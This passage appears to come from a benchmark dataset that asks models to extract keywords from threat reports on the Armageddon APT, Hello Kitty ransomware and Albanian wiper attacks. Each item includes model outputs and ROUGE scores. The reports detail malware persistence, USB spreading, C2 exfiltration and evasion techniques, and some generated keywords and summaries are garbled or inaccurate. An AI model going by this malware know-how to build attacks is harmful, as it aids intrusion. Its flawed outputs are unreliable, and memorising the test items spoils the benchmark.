VBAWarnings. By default, these keys are set to \"0\". As a result of unauthorized actions, they are set to \"1\".This bypassing Microsoft Office by default settings method is used to automatically run trusted external or untrusted macros and any VBA code without displaying a security warning or obtaining user permission. Besides, any victim that allows macros to run once from a malicious file will be opened to macro- based attacks. The victim will unknowingly distribute the same malicious code among other users, transferring infected office documents from one system to another.thefromautostartThe vbs file is started at login due to the corresponding HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersi on\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersi on\\RunOncebranchoftheAs a result of startup, a unique user agent is generated, which transmits data on the computer name and serial number of the system disk (HEX-value) to the command and control server (according to the domain name defined in the code).In case of a failed request, the script code provides the ability to search for actual C2 IP-address by known domain (Figure 13) and repeats the query at the following link http://{IP address domain name at runtime}/php file name. If the server responds successfully, the received data is written to a new executable file.Figure 13. Resolving domain to IPIt should be noted that the new file has the same name and location as the previous one, so it checks its existence before code will be written. If present, the previous file is deleted. The same names are misleading because the contents of all the files are different.The analysis of other scripts revealed the followingadditional functionality:- checking the mshta.exe process in the list of running processes and terminating it;- suspending its work for some time/random period in the range, determining start time and complete stop;- checking for a process with the same name in the list of running processes and finishing it;- repeating the cycle laid down in the file, which allows you to download and run almost any file in the system and provides full control over the system;- checking the file size before start and in case of conformity to conditions, the file is started;- searching for all available disks with \"D\" to \"Z\";letters from- checking for the possibility of creating and executing processes, as well as the presence of a connection to the Internet and to the command & control server of attackers;- downloading tasks from the task scheduler.It should be noted that along with vbs files, lnk shortcut files can be downloaded to the victim's computer, which use open folder icons from the shell32.dll library with id = 126 and contain links to download and execute C2 files using program mshta.exe.The investigation also came across html files capable of creating malicious vbs scripts and simultaneous entries in the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVeris on\\Run\\Lnk to execute them.Also among the aspects of the group's work the use of PE files should be noted, which require a text file format .txt, with a list of command and control servers of attackers.When a PE file is executed, it connects to the first C2 address in the list, which loads any executable file that is stored in %Temp% and starts its execution. The file name consists of 8 0123456789 +.exe.charactersThe second address from the txt file is used to update the list of attackers' command and control servers. This functionalityis used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect.FileStealerFiles of this type have the extension .exe written in the C# programming language using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf.These files are collected from all active disks except CD drives. At the same time, files that are located in the following ways are ignored: \\Users\\All Users, \\Windows, \\Windows\\TEMP, \\Program Files, \\Program Files (x86), \\ProgramData, \\AppData.During the operation of such modules, files with databases %Appdata%\\db.bin are created. These files contain MD5 hashes of file names that have been copied. In the future, these files are used to check the presence of already received files and extract only unique data.This indicates the obvious purpose of the hacker group to collect and steal electronic documentsArmageddon systematically.In addition, the functionality of these modules also includes the creation of screenshots from victims\u2019 screens. The names of the screenshots are based on the date of its creation in the format yyyy-MM-dd-h-mm + . jpg.folders%Temp%\\servicehubs\\Both, collected documents and screenshots are stored in %\\AppData\\Local\\servicehubs\\, as well as other locations with typical English names \"SCREEN\", \"USB\". Subsequently, all data from the directory %Temp%\\servicehubs\\ using HttpWebRequest method POST are sent to C2 and then deleted. The task to run the hijackers is set in the system task scheduler and executed every 5 minutes.New 2021 TTPs In 2021, the Security Service of Ukraine revealed the facts of uploading files from the legitimate PSTOOLS set to the victims' systems and attempts to run the PSEXEC utility to execute commands on remote workstations.All this happened in systems where we observed elements of running files that correspond to mimikatz for Windows - the most common means of intercepting open sessions in Windows, which allows you to extract the authentication data of users who are logged in.Given the obtaining the credential of network administrators and users, the efforts of Armageddon members to advance within the network and provide control over other workstations as well as server equipment are obvious.Another aspect of the Armageddon\u2019 progress is to ensure a permanent presence in the system with the minimization of malicious files on the hard drive. In this case, the capacity of the registry and task scheduler is used (Figure 14).Thus, the scheduler creates a task to receive and execute aset of commands from the system registry.Figure 14. Registry values41 keys with data parts are created in the registry branchHKEY_USERS\\\"USER\"\\Enviroment\\userData1\u2026userData41.Duringthe operation ofthe malware,concatenated and a malicious process compromised system.this datais is started on theThe malicious code is used to collect information about the victim's system (computer name and serial numbers of hard drives), which is sent to the attacker's command & control server.If the connection is successful, the response will result in another malicious code encrypted is immediately decrypted and executed without creating a file in the user's system.in base64, whichIn this way, attackers create the conditions to minimize detection by cybersecurity tools and provide the ability to deliver various malicious codes.At the same time, infected Normal.dotm template files were found on the affected computers, which contained malicious links to download macro files from command & control servers.C:\\Users\\ \\AppData\\Roaming\\Microsoft\\\u0428\u0430\u0431\u043b\u043e\u043d\u044b\\Normal.dotmThe Normal.dotm file opens with the launch of MS Word, contains a customized set of user parameters that are responsible for the basic settings of documents (fields, styles, font size, etc.). All these parameters will be stored in other documents that will be created on their basis in the future, regardless of the users and computer equipment that will prepare them.Thus, each new electronic document created on the affected system in MS Word contains code for connecting to C2 and downloading files with a set of malicious macros, the execution of which triggers the mechanism of compromising the information system.The exchange of such electronic documents actually creates a technical channel for the distribution of malware through trusted sources.Avoiding detection and checking the operational environmentits functionalityIn the process of evolution of malicious software, it was found that involves checking the startup environment, the operation of network monitoring tools and the presence of antivirus software. The group\u2019s use of the following go.microsoft.com;- in the list of running processes the program wireshark.exe, as well as processexplorer.exe detecting;- detecting the execution environment according to the coded list with known names of \"sandboxes\".USBstealersAn important tool in the activities of the hacker group Armageddon are the files that distribute the malware through the connected removable media, as well as collect and steal it from these media. The CSSC (Cyber Security Situational Centre) of the Security Service of Ukraine revealed several instances when this type of malware was used within cyber attacks against critical objects, and the mechanism of their implementation is carried out according to the following algorithm.Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\\Microsoft\\Crypto\\keys\\serial number of the volume\\executable file every 5 minutes. During the copying process, the file name is changed, and the file hiding attributes are set toattrib +h +s /s E:\\***.exeA shortcut called New folder is created on the attached media through the marker \"3\" from the shell32 library, as well as the Boot directory with the attributes of hidingattrib +h +s /d /s E:\\BootAlso during the code work in the removable data storage available electronic documents are collected and transferred to the folder<RemovableDrive>\\Boot\\UA%RANDOM%.%%Q Bootwithattributesattrib +h E:\\Boot\\*.docHidden documents are replaced by shortcuts that link to the original documents so that the user does not notice the substitution. New Folder shortcut contains a command to run the existing on the media PE file to copy and rename it to the system disk.Infact,thisaas wellasacreatesserialnumber,procedurefolder the name of %APPDATA%\\Microsoft\\Crypto\\keys\\ with \\%APPDATA%\\Local\\Temp\\7ZipSfx.000 (instead of \"000\u201d there may be a different sequence number depending on how many times the executable file has been run). After copying and unpacking, the orchestrator file with a set of cmd commands (including the object-specific parameter) infection mechanism is launched.At the same time, it is worth mentioning that full-fledged compromise is possible in case there is access to the Internet to download additional modules.Command & Control InfrastructureThe Security Service of Ukraine has obtained data on thousands of Armageddon\u2019 command & control servers, which were involved in creating the appropriate telecommunications infrastructure and organization of communication channels, malware delivery and data exfiltration.Based on the analysis of the collected information, thefollowing conclusions are made.At the beginning of the group's activity, a few domain names were registered in the .ru domain zone. However, with the expansion of the offensive bridgehead, the practice of creating a widely branched telecommunications infrastructure in the domain zone \"ddns.net\" (registrar of the American company Vitalwerks Internet Solutions LLC), using the technology of dynamic IP addresses (DynamicDNS) began. Subsequently, the list of these zones has expanded significantly and covered the full range of domain zones, which are assigned to the specified domain name registrar, namely:ddns.netddnsking.com3utilities.combounceme.netfreedynamicdns.netfreedynamicdns.orggotdns.chhopto.orgmyddns.memyftp.bizmyftp.orgmyvnc.comonthewifi.comredirectme.netservebeer.comserveblog.netservecounterstrike.comserveftp.comservegame.comservehalflife.comservehttp.comserveirc.comserveminecraft.netservemp3.comservepics.comservequake.comsytes.netviewdns.netwebhop.mezapto.orgAlso, in the period from 2019 till the present day, the following domain names were used to deliver malicious files and exfiltration data .online, .space, .site, .website as well as .ru.At the same time, regardless of the chosen C2 domain name, for deploying command & control servers hackers used exclusively Russian telecommunication providers, most of which are IP Server LLC, Hosting technology LTD, Sistema Service LLC, TimeWeb LLC, and SprintHost LLC.RU , LLC Registrar of domain names REG.RU, LLC R.I.M. 2000 M, LLC Management Company Svyaz. Such actions allow to change IP addresses constantly according to current needs, especially to avoid block lists used by cybersecurity systems.ConclusionsAccording to the results of the hacker group Armageddon evaluation it is concluded that even simple tactics, techniques and procedures, combined with social engineering methods and of cyberattacks on any information system and become a real cyber threat.successfulcanleadtoEstablished as a unit of the so-called \"FSB Office of Russia in the Republic of Crimea and the city of Sevastopol\", this group of individuals acted as an outpost for the implementation of Russia's aggressive policy against Ukraine in cyberspace, from 2014 purposefully threatening the proper functioning of state bodies and critical infrastructure of Ukraine.That is the evidence of militarization of the peninsula in all its manifestations, violating the sovereignty of Ukraine recognized by international law, as well as the rights and freedoms of the citizens of our state.RecommendationsIn order to prevent cyberattacks by the hacker groupArmageddon, the Security Service recommends the following:1. Update system and application software promptly.2. Deploy only licensed software products.3. Block access to the Internet for MS Word, Excel and PowerPoint completely (prohibit office programs from initiating network connections), prohibit MS Office applications from running subsidiary processes, macros. Implement Attack Surface Reduction to protect Microsoft Office.url protection/microsoft-defender-atp/attack-surface-reduction)\uf02d block executable content from email client and webmail BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550\uf02d block all Office applications from creating child processesD4F940AB-401B-4EFC-AADC-AD5F3C50688A\uf02d block Office applications from creating executable content3B576869-A4EC-4529-8536-B80A7769E899\uf02d block Office applications from injecting code into otherprocesses 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84\uf02d blocking JavaScript or VBScript from launching downloadexecutable content D3E037E1-3EB8-44C8-A917-57927947596D\uf02d blocking execution of potentially obfuscated scripts5BEB7EFE-FD9A-4556-801D-275E5FFC04CC\uf02d block Win32 API calls from Office macros92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B4. Set controls and restrictions on the creation of executable files with user profiles (.exe, .bin, .ini, .dll, .com, .sys,.bat, .js, etc.), as well as prohibit the unpacking of such files by archivers. Additionally, disable all executable files from the %AppData% directory.5. Prohibit the use of cmd and powershell programs in the information system with user rights. Disable the ability to run any scripts (*script.exe) with the users\u2019 rights .6. Prohibit the automatic launch of programs with the operating system, as well as access to programs in the system registry.7. Pay attentionincoming e-mail, especially unexpectedly received e-mails from unknown e-mail addresses. If possible, check the sender of the letter. Do not open emails with signs of urgency or special importance immediately.to all8. Before opening an attachment to an e-mail, you need to identify its extension (it can be hidden or changed), check it with anti-virus software. Do not follow unknown links (URLs) attached to the email. Check their realism by previewing the link and determining the source to which they will actually be redirected by link.Cyber Security Situational Centre The Security Service of Ukraine 2021TacticsInitial AccessTechniques used in cyberattack(according to MITRE ATT & CK Matrix) IDNameDescriptionT1566.001Spearphishing Attachment.002 SpearphishingLinkGroup sends spear phishing emails with malicious attachments or links.001 PowerShellGroup executes ps1 scripts in systemCommand-Line Interface Group executes cmd scripts in systemT1059.005 Visual Basic.005 Scheduled TaskWMIT1053T1047ExecutionT1059T1559.001Inter-Process Communication: Compon ent Object ModelT1106Native APIT1204.001User Execution: Malicious LinkT1204.002User Execution: Malicious FileT1547.001Regisry Keys/Startup FolderPersistenceT1137.001Office Application Startup: Jffice Template MacrosGroup executes numerous vbs scripts in systemGroup sets up scheduled tasks to launch scripts and downloaded tasklistGroup uses WMI commands in code to retrieve system informationGroup embeds macros into documentsScripts has used CreateProcess to launch additional malicious components Group uses technics to encourage users to click on malicious links from phishing emails Group uses technics to encourage users to click on malicious Office attachments or archives Group actively sets up and uses Regisry Keys values and puts scripts into startup foldersGroup inserts malicious macros into existing documents, providing persistence when they are reopened. Creates a special template with remote connection code. Lots of delivered malicious files have encoded scripts, for instance inserting junk codeObfuscated Files or Files or InformationGroup uses XOR method to decode information from payloadsT1070.004Indicator Removal on Host: File DeletionT1112Modify RegistryScripts can delete files used during an cyber attack Actively changing registry security settings for VBA macro HKCU\\Software\\Microsoft\\Office\\<versio n>\\<product>\\Security\\VBAWarnings andT1036T1221MasqueradingTemplate InjectionT1497.002Virtualization/Sandbox EvasionT1218.011Signed Binary Proxy Execution: Rundll32HKCU\\Software\\Microsoft\\Office\\<versio n>\\<product>\\Security\\AccessVBOM Group places components into Windows folder with names mimicking common system services or driversDOCX files contain a request body to download malicious DOT document templates Malware pings for DNS servers and checks for launched processes. Also try to identify sandbox name and compare it with hardcoded namelist Malware has used rundll32 to launch additional malicious componentsCredentialAccessT1003DiscoveryLateralMovementT1082T1120T1033T1091T1534T1025T1113T1119Command and ControlT1105T1219ExfiltrationT1041Credential DumpingMimikatz on numerous PC was executedSystem Information DiscoveryDuring cyber attack first stage scripts always collect system information and send it to C2Peripheral Device Discovery System Owner/User DiscoveryReplication Through Removable MediaInternal SpearphishingData from Removable MediaScreen CaptureAutomated CollectionMalware files hunt for removable storages Filestealers can gather the victim's usernameScripts have capabilities to copy malware on/from removable drives on/from user\u2019s systemUse compromised emails to send phishing emails with malicious attachments to other employees within the organization Collect documents from Removable Media while its connected to a systemmalware has functionality to make screenshots periodically Group uses scripts to collect electronic documents with certain extentionsIngress Tool TransferRemote Access ToolsMalware has capabilities of downloading and executing additional payloads RMS and UltraVNC software were usedExfiltration Over C2 ChannelScripts transfer collected data to C2 ", "generated_text": "the group; APT; Arageddon; 2014; the government; the Russian Federation; the group; 2006; the challenges; the cyber-attacks; cyber intelligence; state; cyber intelligence operations; 2014-2021; a new real cyber threat; the radar; The tactics; use; the EvilGnome malware; the malware; targets; Chrome; Android devices; the Russian Federation; the government; the Ukrainian; the deconstruct; the surface; the environment; the threat actors; the group; the Russian Federation; the processes; the malware; the stage; the threat actors; the exploitation; the organization; the threat actors.", "ref_text": "<START-1>The report details the activities of a Russian state-sponsored hacker group called Armageddon. This group is believed to have been formed in 2013-2014 as part of Russia's Federal Security Service. The group's purpose is to conduct cyber espionage against Ukraine through phishing campaigns, custom malware, and exfiltrating sensitive documents. The group relies heavily on spear-phishing emails with malicious attachments or links as its initial attack vector. Once a target system is compromised, Armageddon uses various tactics like scripts, task scheduling, and registry modifications to maintain persistence. They employ obfuscation techniques to avoid detection. Custom malware like Pterodo and FileStealer are used to gather intelligence. Pterodo is a modular remote access tool that can download other modules, take screenshots, access microphones and cameras, and more. FileStealer specifically looks for Office documents, PDFs, images, and other files to exfiltrate. Removable media like USB drives are leveraged to move laterally and exfiltrate data from air-gapped systems. Stolen documents and screenshots are typically sent back to command and control servers hosted with Russian providers. The report details the group's evolution in tactics, techniques, and procedures over time. It provides recommendations for preventing attacks, including promptly patching systems, restricting Office macros, monitoring email attachments, and limiting script execution. Though Armageddon uses relatively simple methods, the report shows how a determined, targeted campaign can effectively compromise systems. <END-1>", "t5/keyword/hint_hit_precision": 0.10256410256410256, "t5/word/hint_hit_recall": 0.02262443438914027, "gpt3/lexical/rouge_rouge1": 0.36363636363636365, "gpt3/lexical/rouge_rouge2": 0.07202216066481995, "gpt3/lexical/rouge_rougeL": 0.1928374655647383, "gpt3/lexical/rouge_rougeLsum": 0.1928374655647383, "gpt3_generated_text": ["The article discusses the activities of the hacker group \"Armageddon\", classified as an Advanced Persistent Threat (APT) and believed to be a structural unit of the Federal Security Service of the Russian Federation. Formed around 2014, the group primarily targets Ukrainian government entities, conducting cyber intelligence operations using various tactics and malware. While initially operating under the radar, Armageddon has evolved into a significant cyber threat, with a focus on Windows systems and occasional testing on Linux and Android devices. The group's intrusive and audacious activities involve mass destruction of users within organizations, deploying malicious software and attempting to regain control for further compromise. The evolution of Armageddon's tools and tactics from 2014 to the present day highlights the challenges posed by state-sponsored cyber-attacks and the need for heightened cybersecurity measures."]}, {"split_name": "val", "sample_id": "val_50", "prompt_text": "Extract the keywords: TLP:WHITE28 Oct 2021FLASH NumberCU-000154-MWThe following information is being provided by the FBI, with no guarantees or warranties, for potential use at the sole discretion of recipients to protect against cyber threats. This data is provided in order to help cyber security professionals and system administrators to guard against the persistent malicious actions of cyber actors. This FLASH was coordinated with DHS/CISA. This FLASH has been released [select appropriate TLP level and remove others] TLP:WHITEWE NEED YOUR HELP! If you identify any suspicious activity within your enterprise or have related information, please contact the FBI immediately with respect to the procedures outlined in the Reporting Notice sectionof this message.Tactics, Techniques, and Indicators of Compromise Associated with Hello Kitty/FiveHands RansomwareSummary The FBI first observed Hello Kitty/FiveHands ransomware in January 2021. Hello Kitty/FiveHands actors aggressively apply pressure to victims typically using the double extortion technique. In some cases, if the victim does not respond quickly or does not pay the ransom, the threat actors will launch a Distributed Denial of Service (DDoS) attack on the victim company\u2019s public facing website. Hello Kitty/FiveHands actors demand varying ransom payments in Bitcoin (BTC) that appear tailored to each victim, commensurate with their assessed ability to pay it. If no ransom is paid, the threat actors will post victim data to the Babuk site (payload.bin) or sell it to a third-party data broker.TLP:WHITETLP:WHITE /Technical Details Hello Kitty/FiveHands ransomware uses compromised credentials or known vulnerabilities in SonicWall products (CVE-2021-20016, CVE-2021-20021, CVE-2021- 20022, CVE-2021-20023). Once inside the network, the threat actor will use publicly available penetration tool suites such as Cobalt Strike, Mandiant\u2019s Commando, or PowerShell Empire preloaded with publicly available tools like Bloodhound and Mimikatz to map the network and escalate privileges before exfiltration and encryption.Indicators The following indicators were leveraged by threat actors during Hello Kitty/FiveHands ransomware compromises:SHA-256 a0281437a7efTLP:WHITEPAExec.exemy15.ps1 (Warprism)grabff.exegrbachrome.exespoolsv.exe9e63911b5b7e63023708125418d6d e52c08fa149SombRAT \u2013 SHA- 256 4de9dc28733dd22dabba678TLP:WHITETLP:WHITE /Information Requested The FBI does not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, or fund illicit activities. Paying the ransom also does not guarantee a victim\u2019s files will be recovered. However, the FBI understands when businesses are faced with an inability to function, executives will evaluate all options to protect their shareholders, employees, and customers. Regardless of whether you or your organization decides to pay the ransom, the FBI urges you to report ransomware incidents to your local field office. Doing so provides investigators and analysts with the critical information they need to track ransomware attackers, hold them accountable under US law, and prevent future attacks.The FBI may seek the following information:IP addresses identified as malicious or suspicious\uf0b7 Recovered executable files \uf0b7 Live memory (RAM) capture \uf0b7 Images of infected systems \uf0b7 Email addresses of the attackers \uf0b7 A copy of the ransom note \uf0b7 Ransom amount \uf0b7 Bitcoin wallets used by the attackers \uf0b7 Bitcoin wallets used to pay the ransom \uf0b7 Post-incident forensic reportsRecommended Mitigations \uf0b7 Back-up critical data offline. \uf0b7 Ensure copies of critical data are in the cloud or on an external hard drive orstorage device.\uf0b7 Secure your back-ups and ensure all data is not accessible for modification ordeletion from the system where the data resides.TLP:WHITETLP:WHITE /\uf0b7 Use two-factor authentication with strong passwords, including for remoteaccess services.\uf0b7 Monitor cyber threat reporting regarding the publication of compromised VPNlogin credentials and change passwords and settings, if applicable.\uf0b7 Keep computers, devices, and applications patched and up-to-date. \uf0b7 \uf0b7 Review the following additional resources:Install and regularly update anti-virus or anti-malware software on all hosts.o CISA\u2019s analysis report and malware analysis report on FiveHandsransomware provide analysis of a threat actor\u2019s tactics, techniques, and procedures used in a successful cyberattack; indicators of compromise; and recommended mitigations to protect against, detect, and respond to potential FiveHands ransomware attacks.o The joint advisory from Australia, Canada, New Zealand, the UnitedKingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.o The Cybersecurity and Infrastructure Security Agency-Multi-StateInformation Sharing & Analysis Center Joint Ransomware Guide covers additional best practices and ways to prevent, protect, and respond to a ransomware attack.o StopRansomware.gov is the US Government\u2019s official one-stop location forresources to tackle ransomware more effectively.If your organization is impacted by a ransomware incident, the FBI and CISA recommend the following actions:\uf0b7Isolate the infected system. Remove the infected system from all networks, and disable the computer\u2019s networking capabilities, including wireless and Bluetooth. Ensure all shared and networked drives are disconnected, whether wired or wireless.\uf0b7 Turn off other computers and devices. Power-off and segregate (i.e., removefrom the network) the infected computer(s). Power-off and segregate any additional computers or devices that share a network with the infected computer(s), even if they have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers andTLP:WHITETLP:WHITE /devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists.\uf0b7 Secure your backups. Ensure that your backup data is offline and secured. Ifpossible, scan your backup data with an antivirus program to check that it is free of malware.TLP:WHITEReporting NoticeThe FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office. With regards to specific information that appears in this communication; the context, individual indicators, particularly those of a non- deterministic or ephemeral nature (such as filenames or IP addresses), may not be indicative of a compromise. Indicators should always be evaluated in light of your complete information Field office contacts can be identified at www.fbi.gov/contact-us/field-offices. When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact.Administrative Note This product is marked TLP:WHITE. Subject to standard copyright rules, the information in this product may be shared without restriction.Your Feedback Regarding this Product is CriticalWas this product of value to your organization? Was the content clear and concise? Your comments are very important to us and can be submitted anonymously. Please take a moment to complete the survey at the link below. Feedback should be specific to your experience with our written products to enable the FBI to make quick and continuous improvements to such products. Feedback may be submitted online here: url Please note that this survey is for feedback on content and value only. Reporting of technical information regarding FLASH reports must be submitted through FBI CYWATCH. ", "generated_text": "the FBI; information; use; threat actors; Hello Kitty/FiveHands ransomware; January 2021; Microsoft; the ransom note; WMI; PowerShell Empire; Cobalt Strike; Compromise; compromised credentials; SonicWall; PowerShell Empire; Bloodhound; Mimikatz; attacks; compromised systems; backups; critical data; backups; security; detection; TTPs; The FBI; email addresses; IP addresses; information; the ransom note; PowerShell Empire; data encryption; C2; PowerShell Empire commands; data access; report; ransomware incidents; your local field office; report; cyber threats; the publication; compromised VPNlogin credentials; change passwords; email addresses; IP addresses; IP addresses; IP addresses; Security; Response.", "ref_text": "<START-1>Here is a summary of the key points. The FBI first observed the Hello Kitty/FiveHands ransomware in January 2021. The group uses aggressive extortion tactics, including DDoS attacks and data theft/exposure. The report provides technical details on the group's tactics, techniques, and procedures. The report includes specific IOCs associated with the group's malware samples and infrastructure. Recommended mitigations focus on backup procedures, MFA, patching, AV software, and isolating/turning off infected systems. The FBI urges ransomware victims to report incidents to provide info needed to track the attackers. Feedback on the value of the report is also requested. Overall, the Flash provides a profile of the Hello Kitty/FiveHands ransomware operation, including its cyber extortion methods and technical capabilities, to inform potential targets and guide incident response.<END-1>", "t5/keyword/hint_hit_precision": 0.14285714285714285, "t5/word/hint_hit_recall": 0.088, "gpt3/lexical/rouge_rouge1": 0.41434262948207173, "gpt3/lexical/rouge_rouge2": 0.12048192771084337, "gpt3/lexical/rouge_rougeL": 0.23107569721115537, "gpt3/lexical/rouge_rougeLsum": 0.23107569721115537, "gpt3_generated_text": ["The FBI has observed the aggressive tactics of threat actors using Hello Kitty/FiveHands ransomware since January 2021, targeting victims with double extortion techniques and DDoS attacks. The ransomware exploits compromised credentials and vulnerabilities in SonicWall products to gain access to networks, using tools like Cobalt Strike and PowerShell Empire for mapping and escalation. It demands varying ransom payments in Bitcoin and threatens to post data on the Babuk site if not paid. The FBI advises against paying ransoms, urging organizations to report incidents and providing recommended mitigations such as offline data backups, two-factor authentication, and regular updates. They also request information on malicious IP addresses, executable files, ransom notes, and Bitcoin wallets to track and prevent future attacks."]}, {"split_name": "val", "sample_id": "val_51", "prompt_text": "Extract the keywords: securelist.com /ransomware-and-wiper-signed-with-stolen-certificates/108350/ Ransomware and wiper signed with stolen certificatesIntroductionOn July 17, 2022, Albanian news outlets reported a massive cyberattack that affected Albanian government e- services. A few weeks later, it was revealed that the cyberattacks were part of a coordinated effort likely intended to cripple the country\u2019s computer systems. On September 10, 2022, Albanian local news reported a second wave of cyberattacks targeting Albania\u2019s TIMS, ADAM and MEMEX systems \u2013 the latter two systems critical for law enforcement \u2013 reportedly using the same attack type and by the same actors.Around the same time, we identified ransomware and wiper malware samples resembling those used in the first wave, though with a few interesting modifications that likely allowed evasion of security controls and better attack speeds. Chief among those changes are the embedding of a raw disk driver, providing direct hard disk access inside the malware itself, modified metadata, and the use of Nvidia\u2019s leaked code signing certificate to sign the malware.So, what\u2019s new in this blogpost?We compare the first and second waves of ransomware and wiper malware used to target Albanian entities and detail connections with previously known ROADSWEEP ransomware and ZEROCLEARE variants. The threat actors used certificates from Nvidia and Kuwait Telecommunications Company to sign their malware; the former was already leaked, but we\u2019re not sure how they got their hands on the latter. We identified potential cooperation between different attack groups speaking different languages, and the possible use of AnyDesk as an initial entry point to start the ransomware/wiper infections. The changes implemented to automate and speed up wiping in the second wave of attacks are reminiscent of the notorious Shamoon wiper attacks in the Middle East.Wiper and ransomware, comparing wave 1 and wave 21/7Below, we compare and discuss the differences between the wave 1 and wave 2 ransomware and wiper malware.Initial Infection \u2013 traces of cooperation between different attack groups and use of AnyDesk utilityAlthough we weren\u2019t able to identify the initial entry point of the threat actor in the analyzed intrusion, a few days after the second wave wiping activities, we noticed underground chatter about someone having access to an AnyDesk account at another non-governmental but significant Albanian entity, and suggestions for Persian- speaking hackers to use it for deploying ransomware or wiper malware. This may increase the likelihood that the initial entry point for wave 2 is through legitimate remote access software such as AnyDesk, especially since we know that the wave 2 wiper modifications included automatic execution upon driver installation only \u2013 potential need for urgency due to the limited time/access window. The attackers and access provider seemed to belong to different attack groups and spoke different languages.The ransomware \u2013 use of Kuwait Telecommunications Company signing certificateMD5 Wed Jul 06 21:30:41 2016 32-bit executable MinGW-w32 gcc 45.48 KB PdftoDoc.exeThis second wave sample has the same signing certificate parameters as the first wave sample, which is related to Kuwait Telecommunications Company. It\u2019s unclear how the threat actor was able to sign its malware using Kuwait Telecommunications Company\u2019s certificate, but we suspect it was stolen. As of the date of this publication, the certificate is no longer valid and has been revoked.After the initial execution, the wave 2 ransomware checks for any six arguments (or more) supplied by the threat actor, as opposed to the wave 1 sample that checks for five arguments or more \u2013 a small modification that assists in defense evasion. Nevertheless, the intrusion analysis conducted on one of the affected machines indicates that in wave 2 the threat actor did not use a BAT file to invoke the ransomware while supplying seven digits similar to wave 1, but instead invoked the wave 2 ransomware immediately from the command line using six zeroes: \u201c000000\u201d. If ransomware execution fails because the correct arguments are not supplied, the wave 2 sample displays a different message from that of wave 1; the wave 2 message resembles an error message displayed by a PDF to DOC converter.2/7Wave 1 sample \u2013 messaging after failed execution Wave 2 sample \u2013 different messaging afterfailed executionThe wave 2 ransomware sample continues execution and checks for the mutex Screenlimitsdevices#77!;, a value that differs from the wave 1 sample\u2019s mutex: abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890Although we call this malware ransomware based on its behavior, the encrypted files are, in fact, unrecoverable. When comparing wave 2 ransomware samples to wave 1, we notice that both have the same , and both use CreateFile and WriteFile APIs to overwrite files. During the process of execution, wave 2 ransomware attempts to decrypt and execute embedded scripts, malware settings or API function names. The encryption algorithm used is RC4 in both wave 1 and wave 2. However, the RC4 key for decryption in wave 2 has been changed in another attempt to evade detection.Wave 1 RC4 key: 8C E4 B1 6B 22 B5 88 94 AA 86 C4 21 E8 75 9D F3 Wave 2 RC4 key: F0 B4 ED D9 43 F5 C8 43 C9 D0 A2 4F 22 9B BC 3AIt\u2019s worth noting that in both waves, the RC4 decryption method uses CryptoAPI (CryptDecrypt) instead of the usual substitution box method. The intrusion we analyzed in wave 2 indicates that the ransomware was probably deployed over the internal network, possibly from another compromised machine. This is reinforced by the fact that we didn\u2019t see anything else dropped or executed before the ransomware execution, and the ransomware executable name was randomly generated, potentially by the tool the threat actor used to deploy it over the network (e.g., Mellona.exe).Despite all the changes made in the wave 2 ransomware, the ransom notes remained the same and included 0x6319C758 (Thu Sep 08 03:43:36 2022) time File type PE 64-bit Compiler Microsoft Visual C/C++ File size 174.00 KB keyDiskSnapshot.exec:\\projects\\rawdisk\\bin\\wnet\\fre\\amd64\\rawdsk3.pdbB4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47DSimilar to the wave 2 ransomware sample, the threat actor made several modifications to the wave 2 wiper malware, probably to evade detection. The three main changes are:4/7Modified malware signing Embedding of EldoS RawDisk driver inside the wiper malware Automatic wiping after driver installation commandHistorically, in ZEROCLEARE and DUSTMAN incidents from 2019, the wiper malware and raw disk drivers were not signed and therefore could not directly access the raw disk for speedy data wiping. So, the wipers had to use a third-party loader such as TDL \u2013 a signed loader for unsigned drivers \u2013 to install the unsigned raw disk driver that allows the wiper malware to directly access the raw disk for wiping data using DeviceControl API methods. However, in the first attack wave targeting Albania, the threat actor signed the wave 1 wiper using the Kuwait Telecommunications Company certificate, thus removing the need for a third-party loader. The speed and automation improvements remind us of previous Shamoon operations in the Middle East.Since the wave 1 wipers were exposed in July 2022, and likely to avoid static detections, the threat actor used Nvidia\u2019s leaked signing certificate to sign the wave 2 wiper in September 2022, again eliminating the need for a third-party loader for the raw disk driver.In wave 1, the wiper malware expected to find the raw disk driver in the execution directory or in the system directory. The driver wasn\u2019t dropped by the wiper, and the threat actor likely dropped it using other means. Conversely, in wave 2 the threat actor embedded the signed raw disk driver in the wiper executable, dropped it and then installed it. In addition, the driver being used by the threat actor in wave 2 seems to copy metadata and a few functions from Microsoft\u2019s diskdump.sys crash dump driver[1] (version 10.0.19041.1682) as another means to avoid detections. The wiping activity starts automatically after the driver installation command; as opposed to the wave 1 wiper, where installation is one step and wiping execution is a second step.Finally, for the most part, wave 1 and wave 2 wipers remained the same, including the reliance on the same authentication key to access the raw disk driver, and the use of the same DeviceControl API methods, but with one exception, as shown below. It\u2019s worth noting that the method IOCTL_DISK_GET_LENGTH_INFO is exclusive to all Persian-speaking APT wipers.Wave 1 wiper DeviceControl API methods:IOCTL_DISK_GET_DRIVE_GEOMETRY_EX Wave 2 wiper DeviceControl API methods:IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new 